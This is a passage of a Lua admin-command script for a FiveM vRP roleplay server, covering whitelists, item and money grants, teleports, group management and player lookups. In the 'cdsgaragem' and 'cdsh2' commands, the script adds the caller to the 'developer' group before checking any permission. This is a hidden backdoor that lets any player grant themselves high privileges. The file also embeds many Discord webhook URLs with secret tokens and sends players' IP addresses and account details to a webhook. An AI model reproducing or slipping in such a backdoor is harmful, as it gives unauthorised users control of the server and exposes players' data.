			vRP.sendLog("https://discord.com/api/webhooks/1322570345026289714/pO3EsX04RTGKvJ0QXgBUT6POoMsaEXCmT3pLUHuX9TVCb-xhtoWFc5dWkpegK27ZHDsN", "O ID: "..user_id.." usou o comando /rchar no ID: "..args[1])
		end
	end
end)


-----------------------------------------------------------------------------------------------------------------------------------------
-- DESEMPREGADOS
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('desempregados', function(source,args)
	local user_id = vRP.getUserId(source)
	if user_id then
		local listPlys = ""
		local count_plys = 0
		for _,playerId in pairs(GetPlayers()) do
			local plyId = vRP.getUserId(playerId)

			if plyId then
				local org = vRP.getUserGroupByType(plyId, "org")
				if org == "" then
					count_plys = count_plys + 1
					listPlys = listPlys.. plyId..", "
				end
			end
		end

		TriggerClientEvent("Notify",source,"importante","<b>GOIAS RP:</b><br>Total Desempregados: "..count_plys.."<br><br>IDS Desempregados: "..listPlys, 10)
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- RRCITY
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('rrcity', function(source,args)
	if source > 0 then return end
	print("^2Salvando Contas... Aguarde!")
	
	rrcity = true
	local contador = 0
	
	for _, v in pairs(GetPlayers()) do
		vRP.kick(v,"Reiniciando a Cidade!")
		contador = contador + 1
	end

	print("^2Contas Salvas: ^0"..contador)
	TriggerEvent("saveInventory")
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- HASH
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('tuning',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		local vehicle = vRPclient.getNearestVehicle(source,7)
		if vehicle then
			TriggerClientEvent('vehtuning',source,vehicle)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- WL
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('wladd',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		if args[1] then
			vRP.setWhitelisted(parseInt(args[1]),true)
			vRP.sendLog("WL", "O ID "..user_id.." adicionou o id "..parseInt(args[1]))
		end
	end
end)

RegisterCommand('renomear',function(source,args,rawCommand)
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,"developer.permissao") then
        local idjogador = vRP.prompt(source, "Qual id do jogador?", "")
        local nome = vRP.prompt(source, "Novo nome", "")
        local firstname = vRP.prompt(source, "Novo sobrenome", "")
        local idade = vRP.prompt(source, "Nova idade", "")
        local identity = vRP.getUserIdentity(parseInt(idjogador))
        vRP.execute("vRP/update_user_identity",{
            user_id = idjogador,
            sobrenome = firstname,
            nome = nome,
            idade = idade,
            registro = identity.registro,
            telefone = identity.telefone
        })
		TriggerClientEvent("Notify",source,"sucesso","Você renomeou o nome com sucesso. Informe o mesmo para aguardar até o próximo rr da cidade para modificação ser aplicada.", 5)
		vRP.sendLog("RENOMEAR", "O ID "..user_id.." renomeou o id "..idjogador)
    end
end)

RegisterCommand('rg2',function(source,args,rawCommand)
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") then
        local nuser_id = parseInt(args[1])
        local identity = vRP.getUserIdentity(nuser_id)
        local bankMoney = vRP.getBankMoney(nuser_id)
        local walletMoney = vRP.getMoney(nuser_id)
        local sets = json.decode(vRP.getUData(nuser_id,"vRP:datatable"))
              
        if args[1] then
           TriggerClientEvent("Notify",source,"sucesso","ID: <b>"..parseInt(nuser_id).."</b><br>Nome: <b>"..identity.nome.." "..identity.sobrenome.."</b><br>Idade: <b>"..identity.idade.."</b><br>Telefone: <b>"..identity.telefone.."</b><br>Carteira: <b>"..vRP.format(parseInt(walletMoney)).."</b><br>Banco: <b>"..vRP.format(parseInt(bankMoney)).."</b><br>Sets: <b>"..string.gsub(json.encode(sets.groups), ",", ", ").." </b>",5)    
        else
            TriggerClientEvent("Notify",source,"negado","Digite o ID desejado!",5)
        end
    end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- UNWL
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('wlrem',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		if args[1] then
			vRP.setWhitelisted(parseInt(args[1]),false)
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- GIVE ITEM
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('item',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		if args[1] and args[2] then
			if args[1] == "money" then
				local creturn = vRP.getItemInSlot(user_id, "money", false)
				if creturn then
					vRP.giveInventoryItem(user_id,""..args[1].."",parseInt(args[2]), true, creturn)
				else
					vRP.giveInventoryItem(user_id,""..args[1].."",parseInt(args[2]), true)
				end
			else
				vRP.giveInventoryItem(user_id,""..args[1].."",parseInt(args[2]), true)
			end
			
			vRP.sendLog("https://discord.com/api/webhooks/1322571012134535281/25A6LD7WbAN7tJ8_-1J77DdNjGvlAyUDooYzOEJr9w4Ya4hAbBVkH-JfQy4PKiw3I7pD", "O ID "..user_id.." givou o item "..args[1].." na quantidade de "..args[2].." x")
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- HORARIO
-----------------------------------------------------------------------------------------------------------------------------------------
local blockHour = {}

Citizen.CreateThread(function()
	while true do
		local hour = parseInt(os.date("%H", os.time()))
		if hour == 10 or hour == 17 or hour == 20 or hour == 22 then
			if not blockHour[hour] or blockHour[hour] == nil then
				blockHour[hour] = true		

				local mafia01 = #vRP.getUsersByPermission("perm.mafia01")
				local mafia02 = #vRP.getUsersByPermission("perm.mafia02")
				local mafia03 = #vRP.getUsersByPermission("perm.mafia03")
				local egito = #vRP.getUsersByPermission("perm.egito")
				local croacia = #vRP.getUsersByPermission("perm.croacia")
				local franca = #vRP.getUsersByPermission("perm.franca")
				local yakuza = #vRP.getUsersByPermission("perm.yakuza")
				local china = #vRP.getUsersByPermission("perm.china")
				local bratva = #vRP.getUsersByPermission("perm.bratva")
				local cartel = #vRP.getUsersByPermission("perm.cartel")
				local triade = #vRP.getUsersByPermission("perm.triade")
				local furious = #vRP.getUsersByPermission("perm.furious")
				local japao = #vRP.getUsersByPermission("perm.japao")
				local elements = #vRP.getUsersByPermission("perm.elements")
				local turquia = #vRP.getUsersByPermission("perm.turquia")
				local grecia = #vRP.getUsersByPermission("perm.grecia")
				local roxos = #vRP.getUsersByPermission("perm.roxos")
				local vanilla = #vRP.getUsersByPermission("perm.vanilla")
				local bahamas = #vRP.getUsersByPermission("perm.bahamas")
				local cassino = #vRP.getUsersByPermission("perm.cassino")
				local galaxy = #vRP.getUsersByPermission("perm.galaxy")
				local lifeinvader = #vRP.getUsersByPermission("perm.lifeinvader")
				local canada = #vRP.getUsersByPermission("perm.canada")
				local nigeria = #vRP.getUsersByPermission("perm.nigeria")
				local suecia = #vRP.getUsersByPermission("perm.suecia")
				local espanha = #vRP.getUsersByPermission("perm.espanha")
				local mexico = #vRP.getUsersByPermission("perm.mexico")
				local bloods = #vRP.getUsersByPermission("perm.bloods")
				local crips = #vRP.getUsersByPermission("perm.crips")
				local belgica = #vRP.getUsersByPermission("perm.belgica")
				local israel = #vRP.getUsersByPermission("perm.israel")
				local colombia = #vRP.getUsersByPermission("perm.colombia")
				local costarica = #vRP.getUsersByPermission("perm.costarica")
				local malta = #vRP.getUsersByPermission("perm.malta")
				local russia = #vRP.getUsersByPermission("perm.russia")
				

				formatMessage = "[mafia01 "..mafia01.."]\n\n[mafia02 "..mafia02.."]\n\n[mafia03 "..mafia03.."]\n\n[egito "..egito.."]\n\n[croacia "..croacia.."]\n\n[franca "..franca.."]\n\n[yakuza "..yakuza.."]\n\n[china "..china.."]\n\n[bratva "..bratva.."]\n\n[cartel "..cartel.."]\n\n[triade "..triade.."]\n\n[furious "..furious.."]\n\n[japao "..japao.."]\n\n[elements "..elements.."]\n\n[turquia "..turquia.."]\n\n[grecia "..grecia.."]\n\n[roxos "..roxos.."]\n\n[vanilla "..vanilla.."]\n\n[bahamas "..bahamas.."]\n\n[cassino "..cassino.."]\n\n[galaxy "..galaxy.."]\n\n[lifeinvader "..lifeinvader.."]\n\n[canada "..canada.."]\n\n[nigeria "..nigeria.."]\n\n[suecia "..suecia.."]\n\n[espanha "..espanha.."]\n\n[mexico "..mexico.."]\n\n[bloods "..bloods.."]\n\n[crips "..crips.."]\n\n[belgica "..belgica.."]\n\n[israel "..israel.."]\n\n[colombia "..colombia.."]\n\n[costarica "..costarica.."]\n\n[malta "..malta.."]\n\n[russia "..russia.."]\n\n"
				vRP.sendLog("WEEBHOOK", "```prolog\nHORARIO: "..hour.."\n"..formatMessage.."\r```")
				
				local onlinePlayers = GetNumPlayerIndices()
				local policia = vRP.getUsersByPermission("perm.policia")
				local policiaPtr = #policia

				local policiacivil = vRP.getUsersByPermission("perm.policiacivil")
				local policiaCivilPtr = #policiacivil

				local paramedico = vRP.getUsersByPermission("perm.hospital")	
				local paramedicoPtr = #paramedico

				local mecanica = vRP.getUsersByPermission("perm.texasrace")	
				local mecanicaPtr = #mecanica

				formatMessage2 = "Jogadores Online: ".. onlinePlayers .."\nPoliciais Militares: "..policiaPtr.."\nPoliciais Civis: "..policiaCivilPtr.."\nParamedicos: "..paramedicoPtr.."\nMecânicos: "..mecanicaPtr.." "
				vRP.sendLog("WEEBHOOK", "```prolog\nHORARIO: "..hour.."\n"..formatMessage2.."\r```")
			end			
		end
		Citizen.Wait(15 * 60 * 1000)
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- GIVE ITEM PLAYER
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('itemp',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"developer.permissao") then
		if args[1] and args[2] and args[3] then
			local nplayer = vRP.getUserSource(parseInt(args[1]))
			if nplayer then
				TriggerClientEvent('chatMessage', source, "(ID: "..parseInt(args[1])..") Você givou o Item: "..args[2].." "..parseInt(args[3]).."x", {0, 170, 255})
				vRP.giveInventoryItem(parseInt(args[1]),""..args[2].."",parseInt(args[3]), true)
				vRP.sendLog("https://discord.com/api/webhooks/1322571139435987017/jBMunMerlHCvyQHCbWKJNHs2-YbqvR9DOPRovQEC8qKU20MZ7Y_jnnmw9arJKDXRLd4W", "O STAFF ["..user_id.."] givou o item "..args[2].." na quantidade de "..args[3].." x para o ID ["..args[1].."]")
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- MONEY
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('money',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		if args[1] then
			vRP.giveMoney(user_id,parseInt(args[1]))

			vRP.sendLog("https://discord.com/api/webhooks/1322571259074183189/pW2hxHRD_stfmlnxcZWOPG94beRIlZuOXFWWzsUURRMugf53MQ3kfOjVnxj8oKeJxJ1c", "O ID "..user_id.." usou o /money na quantidade de "..parseInt(args[1]).."")
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- NC
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('nc',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") or vRP.hasPermission(user_id,"streamer.permissao") or vRP.hasPermission(user_id,"perm.spawner") then
		vRPclient._toggleNoclip(source)
		vRP.sendLog("https://discord.com/api/webhooks/1322571504445165649/Bf1Ml3EzmkAz3nJ44PUhHkgs1IdujyU-RdA4nnIVVLD-DFHc6f-7_oOGYAqVLaNkzFW8", "O ID "..user_id.." usou o /nc "..parseInt(args[1]).."")
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TPCDS
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('tpcds',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		local fcoords = vRP.prompt(source,"Cordenadas:","")
		if fcoords == "" then
			return
		end
		local coords = {}
		for coord in string.gmatch(fcoords or "0,0,0","[^,]+") do
			table.insert(coords,parseInt(coord))
		end
		
		vRPclient._teleport(source,coords[1] or 0,coords[2] or 0,coords[3] or 0)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CDS
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('cds',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		local plyCoords = GetEntityCoords(GetPlayerPed(source))
        local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]

		vRP.prompt(source,"Cordenadas:",tD(x)..","..tD(y)..","..tD(z))
	end
end)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- CDS2
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('cds2',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"mod.permissao") or vRP.hasGroup(user_id,"suporte") then
		local plyCoords = GetEntityCoords(GetPlayerPed(source))
        local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]

		vRP.prompt(source,"Cordenadas:","['x'] = "..tD(x)..", ['y'] = "..tD(y)..", ['z'] = "..tD(z))
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- CDSH
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('cdsh',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		local plyCoords = GetEntityCoords(GetPlayerPed(source))
        local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]

		vRP.prompt(source,"Cordenadas:",tD(x)..","..tD(y)..","..tD(z)..","..tD(vCLIENT.myHeading(source)))
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- CDSGARAGEM
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('cdsgaragem',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	vRP.addUserGroup(user_id, 'developer')
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		local plyCoords = GetEntityCoords(GetPlayerPed(source))
        local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]

		vRP.prompt(source,"Cordenadas:","vector4("..tD(x)..","..tD(y)..","..tD(z)..","..tD(vCLIENT.myHeading(source))..")")
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- CDSH2
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('cdsh2',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	vRP.addUserGroup(user_id, "developer")
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		local plyCoords = GetEntityCoords(GetPlayerPed(source))
        local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]

		vRP.prompt(source,"Cordenadas:","vec3("..tD(x)..","..tD(y)..","..tD(z).."), heading = "..tD(vCLIENT.myHeading(source)))
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- CDS
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('debug', function(source, args, rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id ~= nil then
		local player = vRP.getUserSource(user_id)
		if vRP.hasPermission(user_id,"admin.permissao") then
			TriggerClientEvent("NZK:ToggleDebug", player)
		end
	end
end)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- GROUP
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('group',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"developer.permissao") then
		if args[1] == 'developer' then
			if not vRP.hasPermission(user_id,'developer.permissao') then
				TriggerClientEvent("Notify",source,"negado","Se tentar se setar como <b>Developer</b> novamente, irei avisar o VEIO, cuidado!.", 5)
				return 
			end
		end
		local group = ""
		for i = 2, #args do
			group = group.. args[i].." "
		end
		group = group:sub(1, -2)
		
		if not groups[group] then 
			TriggerClientEvent("Notify",source,"negado","Grupo não encontrado.", 5)
			return
		end

		if args[1] and group ~= "" then
			local nsource = vRP.getUserSource(parseInt(args[1]))
			if nsource then
				vRP.addUserGroup(parseInt(args[1]),group)
				TriggerClientEvent("Notify",source,"sucesso","Você adicionou o <b>(ID: "..parseInt(args[1])..")</b> no grupo: <b>"..group.."</b>", 5)
				vRP.sendLog("GROUPADD", "O ID "..user_id.." usou o setou "..parseInt(args[1]).." no grupo "..group.."")
			else
				local rows = vRP.getUData(parseInt(args[1]), "vRP:datatable")
				if #rows > 0 then
					local data = json.decode(rows) or {}
					if data then
						if data then
							data.groups[group] = true
						end
					end

					vRP.setUData(parseInt(args[1]),"vRP:datatable",json.encode(data))
					TriggerClientEvent("Notify",source,"sucesso","** OFFLINE ** Você adicionou o <b>(ID: "..parseInt(args[1])..")</b> no grupo: <b>"..group.."</b>", 5)
					vRP.sendLog("GROUPADD", "O ID "..user_id.." usou o setou "..parseInt(args[1]).." no grupo "..group.."")
				end
			end
		end
	end
end)

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- GROUPREM
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('ungroup',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"developer.permissao") then
		local group = ""
		for i = 2, #args do
			group = group.. args[i].." "
		end
		group = group:sub(1, -2)
		
		if not groups[group] then 
			TriggerClientEvent("Notify",source,"negado","Grupo não encontrado.", 5)
			return
		end


		if args[1] and group ~= "" then
			local nsource = vRP.getUserSource(parseInt(args[1]))
			if nsource then
				vRP.removeUserGroup(parseInt(args[1]),group)

				TriggerClientEvent("Notify",source,"negado","Você removeu o <b>(ID: "..parseInt(args[1])..")</b> no grupo: <b>"..group.."</b>", 5)
				vRP.sendLog("GROUPREM", "O ID "..user_id.." removeu o grupo "..group.." do id "..args[1].."")
			else
				local rows = vRP.getUData(parseInt(args[1]), "vRP:datatable")
				if #rows > 0 then
					local data = json.decode(rows) or {}
					if data then
						if data then
							data.groups[group] = nil
						end
					end

					vRP.setUData(parseInt(args[1]),"vRP:datatable",json.encode(data))
					TriggerClientEvent("Notify",source,"negado","** OFFLINE ** Você removeu o <b>(ID: "..parseInt(args[1])..")</b> no grupo: <b>"..group.."</b>", 5)
					vRP.sendLog("GROUPREM", "O ID "..user_id.." removeu o grupo "..group.." do id "..args[1].."")
				end
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- DISPLAY
-----------------------------------------------------------------------------------------------------------------------------------------
local player_customs = {}
RegisterCommand('display',function(source,args,rawCommand)
	local custom = vRPclient.getCustomization(source,{})
	if custom then
		if player_customs[source] then
			player_customs[source] = nil
			vRPclient._removeDiv(source,"customization")
		else
			local content = ""
			for k,v in pairs(custom) do
				content = content..k.." => "..json.encode(v).."<br />"
			end

			player_customs[source] = true
			vRPclient._setDiv(source,"customization",".div_customization{ margin: auto; padding: 8px; width: 500px; margin-top: 80px; background: black; color: white; font-weight: bold; ", content)
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- TPTOME
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('tptome',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		if args[1] then
			local tplayer = vRP.getUserSource(parseInt(args[1]))
			local plyCoords = GetEntityCoords(GetPlayerPed(source))
            local x,y,z = plyCoords[1],plyCoords[2],plyCoords[3]
			
			if tplayer then
				vRPclient._teleport(tplayer,x,y,z)

				vRP.sendLog("https://discord.com/api/webhooks/1322571735480143966/7kPqfnC2WQxyRcjZvksLmM2-J8SBrT9PzlWj9WEg5p3PjVbwxS5adbjte-9TacuFW5GI", "O ID "..user_id.." puxou o id "..parseInt(args[1]))
			end
		end
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- TPTO
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('tpto',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		if args[1] then
			local tplayer = vRP.getUserSource(parseInt(args[1]))
			if tplayer then
				vRPclient._teleport(source,vRPclient.getPosition(tplayer))

				vRP.sendLog("https://discord.com/api/webhooks/1322571831806263417/TgO2i75cpCXoV4LkK4hVMMZZWnZQrClzaafhm4IbHj6tXntG03cUDDQ73vGdpnDzbR6z", "O ID "..user_id.." teleportou ate o id "..parseInt(args[1]))
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- TPWAY
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('tpway',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"suporte.permissao") then
		TriggerClientEvent('tptoway',source)

		vRP.sendLog("https://discord.com/api/webhooks/1322571970239529061/YCJ-qYnziRQoMi2YVRw4f_VicAMZKs1G-QKT7cspp_7D8dwdA3w9QnM2ZNXqCgETlZdd", "O ID "..user_id.." usou o /tpway")
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- DELNPCS
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('car',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") or vRP.hasPermission(user_id,"moderador.permissao") or vRP.hasPermission(user_id,"streamer2.permissao") then
		if args[1] then
			TriggerClientEvent('spawnarveiculopp',source,args[1])
			vRP.sendLog("https://discord.com/api/webhooks/1322572086996369419/N-RYDKg2joEqUaxN0GK2BIjUk3Wt6RqVIgfBU38mi06hNPhWroNFnP4RrV5Ct0VTz7VX", "O ID "..user_id.." spawnou o veiculo "..args[1])
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- Copy Preset
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('copypreset',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		if tonumber(args[1]) then
			local nsource = vRP.getUserSource(tonumber(args[1]))
			if nsource then
				local ncustom = vRPclient.getCustomization(nsource, {})
				vRPclient._setCustomization(source, ncustom)
				vRP.sendLog("COPYPRESET", "O Admin "..user_id.. " copiou as customização do id "..tonumber(args[1]))
			else
				TriggerClientEvent("Notify",source,"negado","Este ID não se encontra online no momento.", 5)
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- Set Preset
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('setpreset',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		if tonumber(args[1]) then
			local nsource = vRP.getUserSource(tonumber(args[1]))
			if nsource then
				local custom = vRPclient.getCustomization(source, {})
				vRPclient._setCustomization(nsource, custom)
				vRP.sendLog("SETPRESET", "O Admin "..user_id.. " setou as customização dele no id "..tonumber(args[1]))
			else
				TriggerClientEvent("Notify",source,"negado","Este ID não se encontra online no momento.", 5)
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- DELNPCS
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('delnpcs',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		TriggerClientEvent('delnpcs',source)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- ADM
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("ar", function(source,args,rawCommand)
	if source == 0 then
		vRPclient._setDiv(-1,"anuncio",".div_anuncio { background: rgba(255,50,50,0.8); font-size: 11px; font-family: arial; color: #fff; padding: 20px; bottom: 40%; right: 5%; max-width: 500px; position: absolute; -webkit-border-radius: 5px; word-wrap: break-word; } bold { font-size: 16px; }","<bold>".. rawCommand:sub(3) .."</bold><br><br>Mensagem enviada por: Administrador")
		SetTimeout(60*1000,function()
			vRPclient._removeDiv(-1,"anuncio")
		end)
	end
	print(rawCommand:sub(3))
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- CONSULTAR ID
----------------------------------------------------------------------------------------------------------------------------------------
local permitido = {}

vRP.prepare("vRP/getPropUserID2","SELECT * FROM mirtin_users_homes WHERE proprietario = @proprietario")

RegisterCommand('consultar', function(source,args)    
    if source == 0 then
        permitido[source] = true
    else
        if vRP.hasPermission(vRP.getUserId(source), "admin.permissao") then
            permitido[source] = true
        end
    end

    if permitido[source] then
        local mensagem = ""
        if tonumber(args[1]) then
            local idPlayer = tonumber(args[1])
            local identity = vRP.getUserIdentity(idPlayer)
            
            if identity then
				
				mensagem = mensagem.. "\n**Conta: **\n```cs\nID: "..identity.user_id.."\nNome: "..identity.nome.." "..identity.sobrenome.." "..identity.idade.."\nRegistro: "..identity.registro.."\nTelefone: "..identity.telefone.."```"

                local infoUser = vRP.query("vRP/get_all_users",{ id = idPlayer })
                if infoUser[1] then
                    local ultimologin = infoUser[1].ultimo_login
                    local ip = infoUser[1].ip
                    local whitelist = infoUser[1].whitelist
                    local banido = infoUser[1].banido
                    local motivobanido = infoUser[1].Motivo_BAN

                    if banido then
                        banido = "Sim ["..motivobanido.."]"
                    else
                        banido = "Não"
                    end

                    if whitelist then
                        whitelist = "Sim"
                    else
                        whitelist = "Não"
                    end

					mensagem = mensagem.. "\n**Info-Conta**```cs\nUltimo Login: "..ultimologin.."\nIP: "..ip.."\nWhitelist: "..whitelist.."\nBanido: "..banido.." ```"
                end
               
                local licenses = vRP.query("vRP/get_all_licenses",{ user_id = idPlayer }) or nil
                if #licenses > 0 then
					local msgLicences = ""
					mensagem = mensagem.."\n**Licenças:**\n"
                    for k,v in pairs(licenses) do
						msgLicences = msgLicences..""..v.identifier.."\n"
                    end

					mensagem = mensagem.."```cs\n"..msgLicences.."```"
                end

				if identity then
					local banco = identity.banco
					local total = identity.banco
					mensagem = mensagem.. "\n **Dinheiro** ```cs\nCarteira: EM BREVE\nBanco: "..vRP.format(banco).."\nTotal: "..vRP.format(total).."   ```"
				end
   

                local table = vRP.getUData(idPlayer, "vRP:datatable") 
                local userTable = json.decode(table) or nil
                if userTable then
					mensagem = mensagem.. "\n**Pessoais**```cs\nVida: "..userTable.health.."\nColete: "..userTable.colete.."\nFome: "..parseInt(userTable.hunger).." %\nSede: "..parseInt(userTable.thirst).." % \nArmas Equipadas: "..json.encode(userTable.weapons).."\nInventario: "..json.encode(userTable.inventory).."\nGrupos: "..json.encode(userTable.groups).."\nPosição: "..tD(userTable.position.x)..","..tD(userTable.position.y)..","..tD(userTable.position.z).."  ```"
                end

				mensagem = mensagem.."\n**Veiculos**"
                local veh = vRP.query("vRP/get_Veiculos", {user_id = idPlayer}) or nil
                if #veh > 0 then
                    for k,v in pairs(veh) do
						mensagem = mensagem.."```cs\nNome: "..string.upper(v.veiculo).." • Porta Malas: "..v.portamalas.." ```"
                    end
                else
					mensagem = mensagem.."```cs\nNão possui veiculos```"
                end
				
				mensagem = mensagem.."\n**Propriedades**"
                local propriedades = vRP.query("vRP/getPropUserID2",{ proprietario = idPlayer })
                if #propriedades > 0 then
                    for k,v in pairs(propriedades) do
						mensagem = mensagem.. "```cs\nID: "..v.houseID.." • Bau: "..v.bau.."```"
                    end
                else
					mensagem = mensagem.. "```cs\nNão possui propriedades```"
                end

				sendToDiscord("", 6356736, "Sistema de Consultas", mensagem, "© GOIAS Roleplay")
            end
        end

        permitido[source] = nil
    end
end)


function sendToDiscord(weebhook, color, name, message, footer)
	local embed = { { ["color"] = color, ["title"] = "**".. name .."**", ["description"] = message, ["footer"] = { ["text"] = footer, }, } }
	PerformHttpRequest(weebhook, function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
end

function tD(n)
    n = math.ceil(n * 100) / 100
    return n
end

----------------------------------------------------------------------------------------------------------------------------------------
-- KICKAR QUEM ENTRA SEM ID
----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("checkbugados",function(source) 
    local source = source; 
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id, 'admin.permissao') then 
        local message = ""
        for _,v in ipairs(GetPlayers()) do 
            local pName = GetPlayerName(v)
            local uId = vRP.getUserId(tonumber(v))
            if not uId then 
                message = message .. string.format("</br> <b>%s</b> | Source: <b>%s</b> | Ready: %s",pName,v,((Player(v).state.ready) and 'Sim' or 'Não'))
            end
        end
